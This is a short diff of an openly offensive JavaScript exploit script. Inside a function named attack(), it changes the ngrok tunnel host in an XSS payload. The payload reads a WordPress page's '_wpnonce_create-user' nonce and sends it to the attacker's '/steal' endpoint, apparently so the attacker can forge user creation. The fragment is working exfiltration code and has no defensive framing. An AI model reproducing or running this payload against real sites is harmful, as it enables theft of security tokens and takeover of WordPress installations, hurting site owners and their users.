@@ -24,7 +24,7 @@ function attack() {
     // 3. XSS payload to steal nonce
     const payload = `
       fetch(
-        'https://9c5f-34-141-135-153.ngrok-free.app/steal?nonce=' + 
+        'https://16ee-34-141-135-153.ngrok-free.app/steal?nonce=' + 
         document.querySelector('input[name="_wpnonce_create-user"]').value, 
         { headers: { 'ngrok-skip-browser-warning': 'true' } }
       );
